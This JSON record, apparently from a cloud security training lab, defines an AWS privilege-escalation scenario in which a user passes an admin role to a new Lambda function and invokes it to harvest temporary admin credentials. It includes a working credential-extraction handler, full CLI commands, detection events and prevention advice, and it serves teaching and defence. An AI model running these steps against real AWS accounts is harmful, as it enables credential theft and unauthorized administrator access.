{
  "displayName": "Lambda Function Creation + Invocation to Admin",
  "name": "lambda-001-iam-passrole+lambda-createfunction+lambda-invokefunction",
  "description": "Creating Lambda function with admin role and invoking it to extract temporary credentials",
  "costEstimate": "$0/mo",
  "pathfindingCloudId": "lambda-001",
  "interactiveDemo": false,
  "supportsOnlineMode": false,
  "category": "Privilege Escalation",
  "subCategory": "new-passrole",
  "pathType": "one-hop",
  "target": "to-admin",
  "environments": [
    "prod"
  ],
  "attackPath": {
    "principals": [],
    "summary": ""
  },
  "mitreAttack": {
    "tactics": [
      "TA0004 - Privilege Escalation",
      "TA0002 - Execution"
    ],
    "techniques": [
      "T1098.001 - Account Manipulation: Additional Cloud Credentials",
      "T1648 - Serverless Execution"
    ]
  },
  "terraform": {
    "variableName": "enable_single_account_privesc_one_hop_to_admin_lambda_001_iam_passrole_lambda_createfunction_lambda_invokefunction",
    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/lambda-001-iam-passrole+lambda-createfunction+lambda-invokefunction"
  },
  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/lambda-001-iam-passrole+lambda-createfunction+lambda-invokefunction",
  "schemaVersion": "4.1.1",
  "permissions": {
    "principals": [
      {
        "name": "pl-prod-lambda-001-to-admin-starting-user",
        "required": [
          {
            "permission": "iam:PassRole",
            "resource": "arn:aws:iam::*:role/pl-prod-lambda-001-to-admin-target-role",
            "description": "allows associating the admin role as the Lambda execution role"
          },
          {
            "permission": "lambda:CreateFunction",
            "resource": "*",
            "description": "allows creating a new Lambda function"
          },
          {
            "permission": "lambda:InvokeFunction",
            "resource": "*",
            "description": "allows invoking the Lambda function to extract credentials"
          }
        ],
        "helpful": [
          {
            "permission": "iam:ListRoles",
            "purpose": "discover available privileged roles that can be passed to Lambda"
          },
          {
            "permission": "lambda:GetFunction",
            "purpose": "verify function creation succeeded before invoking"
          },
          {
            "permission": "lambda:DeleteFunction",
            "purpose": "clean up attack artifacts after credential extraction"
          }
        ]
      }
    ]
  },
  "readme": {
    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-lambda-001-to-admin-starting-user` IAM user to the `pl-prod-lambda-001-to-admin-target-role` administrative role by creating a Lambda function with the admin execution role and invoking it to extract temporary credentials.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-lambda-001-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role`",
    "setup": {
      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
      "deployNonInteractive": "```bash\nplabs enable lambda-001-to-admin\nplabs apply\n```",
      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-001-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
    },
    "attack": {
      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-lambda-001-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role` | Admin role that can be passed to Lambda functions |\n| Policy attached to starting user | Grants `iam:PassRole` on target role, `lambda:CreateFunction`, and `lambda:InvokeFunction` |",
      "demoAttack": {
        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation",
        "resourcesCreated": "- A temporary Lambda function (`pl-lambda-001-credential-extractor`) created with the admin execution role to extract credentials",
        "nonInteractive": "```bash\nplabs demo --list\nplabs demo lambda-001-iam-passrole+lambda-createfunction+lambda-invokefunction\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-001-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
      },
      "cleanup": {
        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup lambda-001-iam-passrole+lambda-createfunction+lambda-invokefunction\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-001-to-admin` in the scenarios list\n3. Press `c` to run the cleanup script"
      }
    },
    "teardown": {
      "nonInteractive": "```bash\nplabs disable lambda-001-to-admin\nplabs apply\n```",
      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-001-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
    },
    "defend": {
      "cspm": {
        "whatToDetect": "- IAM user has `iam:PassRole` permission allowing it to pass an administrative role to Lambda\n- IAM user has `lambda:CreateFunction` permission enabling creation of functions with privileged execution roles\n- IAM user has `lambda:InvokeFunction` permission enabling execution of functions that can exfiltrate credentials\n- Privilege escalation path exists: starting user can gain admin privileges via Lambda execution role",
        "prevention": "- Restrict `iam:PassRole` permissions using strict resource conditions to limit which roles can be passed\n- Implement condition keys like `iam:PassedToService` to restrict PassRole to specific AWS services only when necessary\n- Avoid granting broad `lambda:CreateFunction` permissions; use resource tags or naming patterns to limit function creation\n- Implement Service Control Policies (SCPs) that prevent passing roles with administrative permissions to Lambda\n- Use IAM Access Analyzer to identify privilege escalation paths involving PassRole\n- Enable AWS Config rules to detect Lambda functions with overly permissive execution roles"
      },
      "cloudSiem": {
        "cloudTrailEvents": "- `IAM: PassRole` -- Starting user passes an administrative role to a Lambda function; critical when the target role has elevated permissions\n- `Lambda: CreateFunction20150331` -- New Lambda function created with a privileged execution role; high severity when the execution role has admin access\n- `Lambda: Invoke` -- Lambda function invoked; high severity when preceded by CreateFunction with a privileged role",
        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
      }
    },
    "solution": "# Guided Walkthrough: Privilege Escalation via iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction\n\nThis scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass an IAM role to Lambda, create Lambda functions, and invoke them. The attacker can create a Lambda function with an administrative execution role, invoke the function to extract the temporary credentials that Lambda receives, and use those credentials to gain administrator access.\n\nThis is a powerful privilege escalation technique because Lambda functions automatically receive temporary security credentials for their execution role through the AWS SDK. An attacker can create a simple function that returns these credentials via environment variables, invoke it, and immediately gain the privileges of the passed role.\n\nThe attack leverages the AWS serverless execution model where services like Lambda are granted temporary credentials based on their execution role. By combining `iam:PassRole` with Lambda creation and invocation permissions, an attacker can effectively \"borrow\" the privileges of any role they can pass to Lambda.\n\n## The Challenge\n\nYou start as the IAM user `pl-prod-lambda-001-to-admin-starting-user`. Your credentials were obtained from Terraform outputs after deploying this scenario. This user has a narrow but dangerous permission set:\n\n- `iam:PassRole` scoped to `pl-prod-lambda-001-to-admin-target-role`\n- `lambda:CreateFunction` on all resources\n- `lambda:InvokeFunction` on all resources\n\nYour goal is to operate as `pl-prod-lambda-001-to-admin-target-role`, which has `AdministratorAccess`. The role already exists in the account -- you just need a way to assume its identity. Direct `sts:AssumeRole` is not available to you, but you can attach it to a Lambda function.\n\n## Reconnaissance\n\nFirst, confirm your current identity and verify you lack admin access:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::123456789012:user/pl-prod-lambda-001-to-admin-starting-user\n\naws iam list-users --max-items 1\n# An error occurred (AccessDenied) ...\n```\n\nGood -- you cannot list IAM users yet. Now check what roles are available (if you have `iam:ListRoles`):\n\n```bash\naws iam list-roles --query 'Roles[?contains(RoleName, `lambda-001`)].{Name:RoleName,Arn:Arn}' --output table\n```\n\nYou should see `pl-prod-lambda-001-to-admin-target-role` in the output. Note its ARN -- you'll pass this to Lambda in the next step.\n\n## Exploitation\n\n### Step 1: Write the credential-extraction Lambda handler\n\nCreate a minimal Python handler that reads credentials from environment variables. Lambda injects the execution role's temporary credentials into the runtime environment automatically:\n\n```bash\ncat > /tmp/lambda_function.py << 'EOF'\nimport json, os\n\ndef lambda_handler(event, context):\n    return {\n        'statusCode': 200,\n        'body': json.dumps({\n            'AWS_ACCESS_KEY_ID':     os.environ.get('AWS_ACCESS_KEY_ID'),\n            'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),\n            'AWS_SESSION_TOKEN':     os.environ.get('AWS_SESSION_TOKEN'),\n            'message': 'Successfully retrieved admin credentials!'\n        })\n    }\nEOF\n\ncd /tmp && zip -q lambda_function.zip lambda_function.py\n```\n\n### Step 2: Create the Lambda function with the admin execution role\n\nThis is the privilege escalation moment. By specifying the admin role as the `--role`, you are exercising `iam:PassRole` -- attaching an IAM role you don't yourself hold to a compute resource you control:\n\n```bash\nACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)\nADMIN_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-001-to-admin-target-role\"\n\naws lambda create-function \\\n    --function-name pl-lambda-001-credential-extractor \\\n    --runtime python3.11 \\\n    --role \"$ADMIN_ROLE_ARN\" \\\n    --handler lambda_function.lambda_handler \\\n    --zip-file fileb:///tmp/lambda_function.zip \\\n    --timeout 30\n```\n\nLambda accepts the request, creates the function, and binds the admin role to it. AWS will mint temporary credentials for `pl-prod-lambda-001-to-admin-target-role` whenever the function is invoked.\n\n### Step 3: Wait for the function to become active\n\nLambda needs a few seconds to initialize the execution environment after creation:\n\n```bash\nsleep 15\n```\n\n### Step 4: Invoke the function and capture the credentials\n\n```bash\naws lambda invoke \\\n    --function-name pl-lambda-001-credential-extractor \\\n    --payload '{}' \\\n    /tmp/response.json\n\ncat /tmp/response.json | jq '.'\n```\n\nThe response body contains the three credential components from inside the Lambda execution environment:\n\n```json\n{\n  \"statusCode\": 200,\n  \"body\": \"{\\\"AWS_ACCESS_KEY_ID\\\": \\\"ASIA...\\\", \\\"AWS_SECRET_ACCESS_KEY\\\": \\\"...\\\", \\\"AWS_SESSION_TOKEN\\\": \\\"...\\\"}\"\n}\n```\n\nParse and export them:\n\n```bash\nBODY=$(cat /tmp/response.json | jq -r '.body')\nexport AWS_ACCESS_KEY_ID=$(echo \"$BODY\"     | jq -r '.AWS_ACCESS_KEY_ID')\nexport AWS_SECRET_ACCESS_KEY=$(echo \"$BODY\" | jq -r '.AWS_SECRET_ACCESS_KEY')\nexport AWS_SESSION_TOKEN=$(echo \"$BODY\"     | jq -r '.AWS_SESSION_TOKEN')\n```\n\n## Verification\n\nConfirm you are now operating as the admin role:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:sts::123456789012:assumed-role/pl-prod-lambda-001-to-admin-target-role/pl-lambda-001-credential-extractor\n\naws iam list-users --max-items 3 --output table\n# +----+------+-----+\n# |         Users   |\n# +----+------+-----+\n# ...\n```\n\nIf `list-users` succeeds, you have administrator access. The escalation is complete.\n\n## What Happened\n\nYou started with a limited IAM user that could not access any privileged resources directly. The `iam:PassRole` permission -- often granted carelessly alongside compute service permissions -- let you delegate an admin identity to a Lambda function you created. Lambda's execution model then handed you that identity's temporary credentials on a silver platter the moment you invoked the function.\n\nThis technique is representative of a broad class of real-world privilege escalation paths: whenever a principal can both (1) pass a privileged role to a compute service and (2) trigger execution on that service, they effectively control the role. The same pattern applies to EC2, ECS, Glue, CodeBuild, SageMaker, and others -- the service is just the intermediary that converts `iam:PassRole` into usable credentials.\n"
  },
  "attackMap": {
    "nodes": [
      {
        "id": "starting-principal",
        "label": "Starting User",
        "type": "principal",
        "subType": "iam-user",
        "arn": "arn:aws:iam::{account_id}:user/pl-prod-lambda-001-to-admin-starting-user",
        "access": {
          "type": "assumed-breach-credentials"
        },
        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole permission on the target admin role, along with lambda:CreateFunction and lambda:InvokeFunction permissions. This combination allows you to create a Lambda function that runs as the admin role and extract its temporary credentials.\n"
      },
      {
        "id": "lambda-function",
        "label": "Lambda Function",
        "type": "resource",
        "subType": "lambda-function",
        "arn": "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-001-credential-extractor",
        "description": "This Lambda function is created by the attacker during the attack. It is configured to use the admin target role as its execution role. When invoked, the function returns the temporary AWS credentials it received from the execution role, allowing the attacker to operate as the admin role.\n"
      },
      {
        "id": "target-role",
        "label": "Admin Role",
        "type": "principal",
        "subType": "iam-role",
        "isTarget": true,
        "arn": "arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role",
        "description": "This IAM role has AdministratorAccess. By passing this role to a Lambda function and invoking that function to extract its temporary credentials, you now have the ability to operate as an administrator in this AWS account.\n"
      }
    ],
    "edges": [
      {
        "from": "starting-principal",
        "to": "lambda-function",
        "label": "iam:PassRole + lambda:CreateFunction",
        "description": "Create a Lambda function that uses the admin target role as its execution role. The iam:PassRole permission allows the starting user to associate the admin role with the new Lambda function.\n",
        "hints": [
          "Review the policy attached to this user -- which IAM role can you pass, and to which service?",
          "Use iam:ListRoles to discover roles in the account and identify which ones have elevated permissions.",
          "You can attach an IAM role to a Lambda function at creation time using the --role flag; this is what iam:PassRole enables.",
          "Write a minimal Lambda handler that reads and returns the execution role credentials from environment variables -- AWS injects them automatically.",
          "Package your handler as a zip file and use lambda:CreateFunction to deploy it with the admin role as the execution role.",
          "Browse to https://pathfinding.cloud/paths/lambda-001 for technique details."
        ],
        "commands": [
          {
            "description": "Create a Lambda deployment package that extracts execution role credentials",
            "command": "cat > /tmp/lambda_function.py << 'EOF'\nimport os, json\ndef lambda_handler(event, context):\n    return {\n        'statusCode': 200,\n        'body': json.dumps({\n            'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'),\n            'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),\n            'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN')\n        })\n    }\nEOF\ncd /tmp && zip -q lambda_function.zip lambda_function.py\n"
          },
          {
            "description": "Create the Lambda function with the admin execution role",
            "command": "aws lambda create-function --function-name pl-lambda-001-credential-extractor --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30"
          }
        ]
      },
      {
        "from": "lambda-function",
        "to": "target-role",
        "label": "lambda:InvokeFunction",
        "description": "Invoke the Lambda function to execute code under the admin role's identity. The function returns the temporary credentials assigned to it via the execution role, granting the attacker administrative access.\n",
        "hints": [
          "Lambda functions need a few seconds to initialize after creation before they are ready to invoke.",
          "Use lambda:GetFunction to check the function's State field and confirm it is Active before invoking.",
          "Invoke the function with an empty payload and capture the response to a local file; the credentials are in the response body.",
          "The response body is a JSON-encoded string -- you need to parse it twice (outer response, then the body field) to extract the three credential values.",
          "Export AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN from the parsed response, then verify your new identity with sts:GetCallerIdentity."
        ],
        "commands": [
          {
            "description": "Invoke the Lambda function and capture the response",
            "command": "aws lambda invoke --function-name pl-lambda-001-credential-extractor --payload '{}' /tmp/response.json && cat /tmp/response.json | jq '.'"
          },
          {
            "description": "Parse and export the extracted admin credentials",
            "command": "BODY=$(cat /tmp/response.json | jq -r '.body') && export AWS_ACCESS_KEY_ID=$(echo \"$BODY\" | jq -r '.AWS_ACCESS_KEY_ID') && export AWS_SECRET_ACCESS_KEY=$(echo \"$BODY\" | jq -r '.AWS_SECRET_ACCESS_KEY') && export AWS_SESSION_TOKEN=$(echo \"$BODY\" | jq -r '.AWS_SESSION_TOKEN')"
          },
          {
            "description": "Verify administrator access",
            "command": "aws sts get-caller-identity && aws iam list-users --max-items 3 --output table"
          }
        ]
      }
    ]
  },
  "hasAttackMap": true,
  "slug": "lambda-001",
  "hasDemoTranscript": true
}